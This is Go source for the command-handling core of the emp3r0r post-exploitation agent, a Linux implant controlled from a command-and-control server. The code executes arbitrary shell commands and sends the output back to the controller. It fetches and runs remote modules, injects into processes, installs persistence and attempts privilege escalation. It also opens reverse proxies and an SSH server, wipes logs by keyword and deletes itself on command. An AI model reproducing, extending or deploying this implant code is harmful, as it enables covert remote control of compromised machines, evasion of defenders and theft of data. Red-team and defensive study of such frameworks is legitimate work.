package agent

// build +linux

import (
	"context"
	"encoding/json"
	"fmt"
	"log"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
	"github.com/jm33-m0/emp3r0r/core/lib/util"
	"github.com/otiai10/copy"
)

// exec cmd, receive data, etc
func processCCData(data *emp3r0r_data.MsgTunData) {
	var (
		data2send   emp3r0r_data.MsgTunData
		out         string
		outCombined []byte
		err         error
	)
	data2send.Tag = emp3r0r_data.AgentTag

	payloadSplit := strings.Split(data.Payload, emp3r0r_data.OpSep)
	if len(payloadSplit) <= 1 {
		log.Printf("Cannot parse CC command: %s, wrong OpSep maybe?", data.Payload)
		return
	}
	cmd_id := payloadSplit[len(payloadSplit)-1]

	// command from CC
	cmdSlice := strings.Fields(payloadSplit[1])

	// send response to CC
	sendResponse := func(resp string) {
		data2send.Payload = fmt.Sprintf("cmd%s%s%s%s",
			emp3r0r_data.OpSep,
			strings.Join(cmdSlice, " "),
			emp3r0r_data.OpSep,
			out)
		data2send.Payload += emp3r0r_data.OpSep + cmd_id // cmd_id for cmd tracking
		if err = Send2CC(&data2send); err != nil {
			log.Println(err)
		}
	}

	// # shell helpers
	if strings.HasPrefix(cmdSlice[0], "#") {
		out = shellHelper(cmdSlice)
		sendResponse(out)
		return
	}

	switch cmdSlice[0] {

	/*
		utils
	*/
	case "screenshot":
		if len(cmdSlice) != 1 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		out, err = util.Screenshot()
		if err != nil || out == "" {
			out = fmt.Sprintf("Error: failed to take screenshot: %v", err)
			sendResponse(out)
			return
		}

		// move to agent root
		err = os.Rename(out, emp3r0r_data.AgentRoot+"/"+out)
		if err == nil {
			out = emp3r0r_data.AgentRoot + "/" + out
		}

		// tell CC where to download the file
		sendResponse(out)

	case "suicide":
		if len(cmdSlice) != 1 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}
		err = os.RemoveAll(emp3r0r_data.AgentRoot)
		if err != nil {
			log.Fatalf("Failed to cleanup files")
		}
		log.Println("Exiting")
		os.Exit(0)

		/*
			fs commands
		*/

		// ls current path
	case "ls":
		target_dir := "."
		if len(cmdSlice) > 1 && !strings.HasPrefix(cmdSlice[1], "--") {
			target_dir = cmdSlice[1]
		} else {
			target_dir, err = os.Getwd()
			if err != nil {
				log.Printf("cwd: %v", err)
				sendResponse(err.Error())
				return
			}
		}
		log.Printf("Listing %s", target_dir)
		out, err = util.LsPath(target_dir)
		if err != nil {
			out = err.Error()
		}
		sendResponse(out)

		// remove file/dir
	case "rm":
		if len(cmdSlice) < 2 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		path := strings.Join(cmdSlice[1:], " ")
		out = "Deleted " + path
		if err = os.RemoveAll(path); err != nil {
			out = fmt.Sprintf("Failed to delete %s: %v", path, err)
		}
		sendResponse(out)

		// mkdir
	case "mkdir":
		if len(cmdSlice) < 2 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		path := strings.Join(cmdSlice[1:], " ")
		out = "Mkdir " + path
		if err = os.MkdirAll(path, 0700); err != nil {
			out = fmt.Sprintf("Failed to mkdir %s: %v", path, err)
		}
		sendResponse(out)

		// copy file/dir
	case "cp":
		if len(cmdSlice) < 3 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		out = fmt.Sprintf("%s has been copied to %s", cmdSlice[1], cmdSlice[2])
		if err = copy.Copy(cmdSlice[1], cmdSlice[2]); err != nil {
			out = fmt.Sprintf("Failed to copy %s to %s: %v", cmdSlice[1], cmdSlice[2], err)
		}
		sendResponse(out)

		// move file/dir
	case "mv":
		if len(cmdSlice) < 3 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		out = fmt.Sprintf("%s has been moved to %s", cmdSlice[1], cmdSlice[2])
		if err = os.Rename(cmdSlice[1], cmdSlice[2]); err != nil {
			out = fmt.Sprintf("Failed to move %s to %s: %v", cmdSlice[1], cmdSlice[2], err)
		}
		sendResponse(out)

		// change directory
	case "cd":
		out = "cd failed"
		if len(cmdSlice) < 2 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		path := strings.Join(cmdSlice[1:], " ")
		if os.Chdir(path) == nil {
			out = "changed directory to " + strconv.Quote(path)
		}
		sendResponse(out)

		// current working directory
	case "pwd":
		if len(cmdSlice) != 1 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		pwd, err := os.Getwd()
		if err != nil {
			log.Println("processCCData: cant get pwd: ", err)
			pwd = err.Error()
		}

		out = "current working directory: " + pwd
		sendResponse(out)

		// put file on agent
	case "put":
		if len(cmdSlice) < 4 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		url := fmt.Sprintf("%swww/%s", emp3r0r_data.CCAddress, cmdSlice[1])
		path := cmdSlice[2]
		size, err := strconv.ParseInt(cmdSlice[3], 10, 64)
		if err != nil {
			out = fmt.Sprintf("processCCData: cant get size of %s: %v", url, err)
			sendResponse(out)
			return
		}
		_, err = DownloadViaCC(url, path)
		if err != nil {
			out = fmt.Sprintf("processCCData: cant download %s: %v", url, err)
			sendResponse(out)
			return
		}

		// checksum
		checksum := tun.SHA256SumFile(path)
		downloadedSize := util.FileSize(path)
		out = fmt.Sprintf("%s has been uploaded successfully, sha256sum: %s", path, checksum)
		if downloadedSize < size {
			out = fmt.Sprintf("Uploaded %d of %d bytes, sha256sum: %s\nYou can run `put` again to resume uploading", downloadedSize, size, checksum)
		}

		sendResponse(out)

		/*
		   !command: special commands (not sent by user)
		*/
		// stat file
	case "!stat":
		if len(cmdSlice) < 2 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		path := cmdSlice[1]
		fi, err := os.Stat(path)
		if err != nil || fi == nil {
			out = fmt.Sprintf("cant stat file %s: %v", path, err)
			sendResponse(out)
			return
		}
		fstat := &util.FileStat{}
		fstat.Name = util.FileBaseName(path)
		fstat.Size = fi.Size()
		fstat.Checksum = tun.SHA256SumFile(path)
		fstat.Permission = fi.Mode().String()
		fiData, err := json.Marshal(fstat)
		out = string(fiData)
		if err != nil {
			out = fmt.Sprintf("cant marshal file info %s: %v", path, err)
		}
		sendResponse(out)

	case "!" + emp3r0r_data.ModREVERSEPROXY:
		// reverse proxy
		if len(cmdSlice) != 2 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}
		addr := cmdSlice[1]
		out = "Reverse proxy for " + addr + " finished"

		hasInternet := tun.HasInternetAccess()
		isProxyOK := tun.IsProxyOK(emp3r0r_data.AgentProxy)
		if !hasInternet && !isProxyOK {
			out = "We dont have any internet to share"
		}
		for p, cancelfunc := range ReverseConns {
			if addr == p {
				cancelfunc() // cancel existing connection
			}
		}
		addr += ":" + emp3r0r_data.ReverseProxyPort
		ctx, cancel := context.WithCancel(context.Background())
		if err = tun.SSHProxyClient(addr, &ReverseConns, ctx, cancel); err != nil {
			out = err.Error()
		}
		sendResponse(out)

	case "!lpe":
		// LPE helper
		// !lpe script_name
		if len(cmdSlice) < 2 {
			log.Printf("args error: %s", cmdSlice)
			out = fmt.Sprintf("args error: %s", cmdSlice)
			sendResponse(out)
			return
		}

		helper := cmdSlice[1]
		out = lpeHelper(helper)
		sendResponse(out)

	case "!sshd":
		// sshd server
		// !sshd id shell port args
		log.Printf("Got sshd request: %s", cmdSlice)
		if len(cmdSlice) < 3 {
			log.Printf("args error: %s", cmdSlice)
			out = fmt.Sprintf("args error: %s", cmdSlice)
			sendResponse(out)
			return
		}
		shell := cmdSlice[1]
		port := cmdSlice[2]
		args := cmdSlice[3:]
		go func() {
			err = SSHD(shell, port, args)
			if err != nil {
				log.Printf("Failed to start SSHD: %v", err)
			}
		}()
		out = "success"
		for !tun.IsPortOpen("127.0.0.1", port) {
			time.Sleep(100 * time.Millisecond)
			if err != nil {
				out = fmt.Sprintf("sshd failed to start: %v", err)
				break
			}
		}
		sendResponse(out)

		// proxy server
	case "!proxy":
		if len(cmdSlice) != 3 {
			log.Printf("args error: %s", cmdSlice)
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}
		log.Printf("Got proxy request: %s", cmdSlice)
		addr := cmdSlice[2]
		err = Socks5Proxy(cmdSlice[1], addr)
		if err != nil {
			log.Printf("Failed to start Socks5Proxy: %v", err)
		}
		return

		// port fwd
		// cmd format: !port_fwd [to/listen] [shID] [operation]
	case "!port_fwd":
		if len(cmdSlice) != 4 {
			log.Printf("Invalid command: %v", cmdSlice)
			return
		}
		switch cmdSlice[3] {
		case "stop":
			sessionID := cmdSlice[1]
			pf, exist := PortFwds[sessionID]
			if exist {
				pf.Cancel()
				log.Printf("port mapping %s stopped", pf.Addr)
				break
			}
			log.Printf("port mapping %s not found", pf.Addr)
		case "reverse":
			go func() {
				addr := cmdSlice[1]
				sessionID := cmdSlice[2]
				err = PortFwd(addr, sessionID, true)
				if err != nil {
					log.Printf("PortFwd (reverse) failed: %v", err)
				}
			}()
		case "on":
			go func() {
				to := cmdSlice[1]
				sessionID := cmdSlice[2]
				err = PortFwd(to, sessionID, false)
				if err != nil {
					log.Printf("PortFwd failed: %v", err)
				}
			}()
		default:
		}

		return

		// delete_portfwd
	case "!delete_portfwd":
		if len(cmdSlice) != 2 {
			return
		}
		for id, session := range PortFwds {
			if id == cmdSlice[1] {
				session.Cancel()
			}
		}
		return

		// GDB inject
	case "!inject":
		if len(cmdSlice) != 3 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}
		out = fmt.Sprintf("%s: success", cmdSlice[1])
		pid, err := strconv.ParseInt(cmdSlice[2], 10, 32)
		if err != nil {
			log.Print("Invalid pid")
		}
		err = InjectorHandler(int(pid), cmdSlice[1])
		if err != nil {
			out = "failed: " + err.Error()
		}
		sendResponse(out)

		// download utils
	case "!utils":
		out = VaccineHandler()
		sendResponse(out)

		// download a module and run it
	case "!custom_module":
		if len(cmdSlice) != 3 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}
		out = moduleHandler(cmdSlice[1], cmdSlice[2])
		sendResponse(out)

		// persistence
	case "!persistence":
		if len(cmdSlice) != 2 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}
		out = "Success"
		SelfCopy()
		if cmdSlice[1] == "all" {
			err = PersistAllInOne()
			if err != nil {
				log.Print(err)
				out = fmt.Sprintf("Result: %v", err)
			}
		} else {
			out = "No such method available"
			if method, exists := PersistMethods[cmdSlice[1]]; exists {
				out = "Success"
				err = method()
				if err != nil {
					log.Println(err)
					out = fmt.Sprintf("Result: %v", err)
				}
			}
		}
		sendResponse(out)

		// get_root
	case "!get_root":
		if os.Geteuid() == 0 {
			out = "You already have root!"
		} else {
			err = GetRoot()
			out = fmt.Sprintf("LPE exploit failed:\n%v", err)
			if err == nil {
				out = "Got root!"
			}
		}
		sendResponse(out)

		// upgrade
	case "!upgrade_agent":
		if len(cmdSlice) != 2 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}

		out = "Done"
		checksum := cmdSlice[1]
		err = Upgrade(checksum)
		if err != nil {
			out = err.Error()
		}
		sendResponse(out)

		// log cleaner
	case "!clean_log":
		if len(cmdSlice) != 2 {
			sendResponse(fmt.Sprintf("args error: %v", cmdSlice))
			return
		}
		keyword := cmdSlice[1]
		out = "Done"
		err = CleanAllByKeyword(keyword)
		if err != nil {
			out = err.Error()
		}
		sendResponse(out)

	default:
		// exec cmd using os/exec normally, sends stdout and stderr back to CC
		cmd := exec.Command(emp3r0r_data.DefaultShell, "-c", strings.Join(cmdSlice, " "))
		outCombined, err = cmd.CombinedOutput()
		if err != nil {
			log.Println(err)
			outCombined = []byte(fmt.Sprintf("%s\n%v", outCombined, err))
		}

		out = string(outCombined)
		sendResponse(out)
	}
}
